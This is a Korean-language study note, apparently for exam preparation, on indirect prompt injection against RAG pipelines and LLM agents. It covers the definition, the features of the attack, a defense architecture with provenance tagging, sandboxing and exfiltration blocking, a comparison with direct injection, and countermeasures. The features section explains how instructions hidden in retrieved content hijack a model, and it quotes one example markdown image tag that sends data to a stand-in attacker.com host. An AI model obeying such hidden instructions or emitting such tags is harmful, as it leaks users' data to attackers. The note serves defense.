## Ⅰ. 개요

- **정의**: 사용자가 직접 악성 프롬프트를 입력하지 않고 웹페이지, 이메일 본문, PDF, 검색 DB 등 외부 비신뢰 데이터 소스 내에 악의적 지시문을 은닉해두어, RAG 파이프라인이나 에이전트가 이를 검색·참조하는 순간 모델의 실행 컨텍스트를 탈취하는 사이버 공격 기법
- **배경 및 필요성**: LLM이 RAG 및 자율 에이전트와 결합하여 외부 데이터를 실시간 수집·반영함에 따라, 공격자가 데이터 소스에 심어둔 숨은 명령이 사용자 의도와 무관하게 백그라운드에서 자동 실행되어 민감 데이터의 외부 무단 반출(Data Exfiltration) 및 비인가 API 호출을 유발하므로 출처 격리 및 실행 제어 필수

## Ⅱ. 특징

- 제3자 외부 콘텐츠(웹, 메일, 문서)를 매개로 침투하여 사용자가 인지하지 못하는 지연 발동(Latent Trigger) 특성 보유
- RAG 검색 엔진 및 에이전트의 도구 권한과 결합되어 단순 텍스트 생성을 넘어 시스템 침해로 확산
- 마크다운 이미지 렌더링 태그(`![alt](https://attacker.com/leak?data=...)`) 등을 악용한 아웃오브밴드(OOB) 데이터 탈취 수행

## Ⅲ. 구조 및 구성요소

```text
Indirect_Prompt_Injection_Defense
├── Provenance_Tagging (외부 데이터 출처 메타데이터 라벨링)
├── Context_Sandboxing (비신뢰 검색 데이터의 격리 영역 배치)
├── Policy_Arbiter (원래 사용자 의도와의 일치성 검증기)
└── Exfiltration_Blocker (외부 웹훅 차단 및 마크다운 렌더링 필터)
```

- 선들의 의미: 실선(──)과 가지선(├──, └──)은 계층적 하위 관계를 의미함

| 구성요소 | 세부 항목 | 핵심 역할 |
|:---|:---|:---|
| 출처 라벨링 모듈 | 데이터 출처 메타데이터, 신뢰 점수 | 검색된 문서의 원천 및 검증 상태를 태깅하여 모델에 비신뢰 데이터임을 명시 |
| 컨텍스트 샌드박스 | XML 분리 태그, 읽기 전용 격리 공간 | 외부 문서를 지시문이 아닌 순수 참조 데이터 구역으로 강제 격리 |
| 정책 중재기 | 원래 사용자 목표 대조기, 의도 일치성 검사기 | 검색 문서에 의해 유도된 도구 호출이 사용자 본래 요청과 일치하는지 판정 |
| 데이터 유출 차단기 | 아웃바운드 네트워크 통제, CSP 필터 | 마크다운 이미지 링크를 통한 URL 쿼리 파라미터 기반 정보 반출 원천 차단 |

## Ⅳ. 흐름도

```text
[외부 오염 문서 RAG 검색 및 수집] (① 검색 파이프라인을 통해 악성 은닉 지시문 문서 인덱싱)
│
▼
[출처 메타데이터 라벨링 및 태깅] (② 외부 비신뢰 데이터임을 식별하는 태그 부여)
│
▼
[격리된 데이터 컨텍스트에 주입] (③ 프롬프트 내 `<untrusted_source>` 블록에 격리 삽입)
│
▼
[LLM 응답 생성 및 도구 호출 검증] (④ 외부 문서의 유도 명령과 사용자의 본래 목표 간 충돌 검사)
│
▼
[반출 필터링 및 안전 렌더링] (⑤ 외부 통신 URL 차단 및 비인가 외부 반출 무력화)
```

- 분기 결과: 모델이 제안한 도구 호출이 사용자의 본래 의도와 일치하고 안전한 파라미터임이 확인되면 실행을 승인하고, 외부 문서에 의한 강제 명령 승격 또는 무단 반출 감지 시 즉시 실행을 차단하고 격리 처리

## Ⅴ. 종류 및 비교

| 구분 | 간접 프롬프트 인젝션 (Indirect) | 직접 프롬프트 인젝션 (Direct) |
|:---|:---|:---|
| 공격 페이로드 위치 | 외부 웹페이지, 이메일, 공유 문서, DB 레코드 | 챗봇 대화창의 사용자 직접 입력 프롬프트 |
| 공격 실행 트리거 | RAG 검색, 웹 브라우징, 문서 요약 시 자동 발동 | 사용자가 엔터 키를 눌러 대화를 전송하는 즉시 발동 |
| 사용자 관점 | 사용자는 정상 질문을 수행하므로 공격 인지 불가능 | 사용자가 직접 악의적 프롬프트(공격자)이거나 탈옥 시도 |
| 피해 양상 | RAG 문서 권한 탈취, 민감정보 백그라운드 반출 | 시스템 프롬프트 탈취, 유해 발언 생성, 즉각적 가드레일 우회 |

## Ⅵ. 실무 고려사항 및 대책

| 문제 | 대책 | 효과 |
|:---|:---|:---|
| 검색된 외부 문서 내 악성 지시문의 명령어 자동 승격 | 출처 기반 신뢰도 라벨링 및 이중 LLM(격리 요약 모델) 적용 | 비신뢰 데이터의 실행 지시 전환 원천 차단 |
| 공격 지시가 에이전트 도구를 호출하여 내부 API 오용 | 사용자 본래 질의 의도(User Intent)와의 일치성 독립 검증 게이트 운영 | 검색 문서 기반 비인가 도구 호출 및 시스템 장악 방어 |
| 마크다운 이미지 태그를 통한 자동 웹훅 데이터 유출 | 프론트엔드 CSP(Content Security Policy) 적용 및 이미지 렌더링 필터링 | 브라우저 백그라운드 데이터 유출 채널 완전 봉쇄 |

## Ⅶ. 결론

- **기술 위상/발전**: 검색 증강 생성(RAG)과 웹 연동 자율 에이전트 환경에서 외부 비신뢰 콘텐츠를 매개로 시스템을 장악하는 **엔터프라이즈 생성형 AI 생태계의 최고 고위험 공격 벡터**
- **실무 적용/통제**: 외부 검색 데이터의 **출처 라벨링 및 XML 구조적 격리**를 의무화하고, 도구 호출 시 **사용자 원래 의도 검증 게이트웨이 및 아웃바운드 유출 차단 필터**를 결합한 종단간 방어 체계 구축 필요
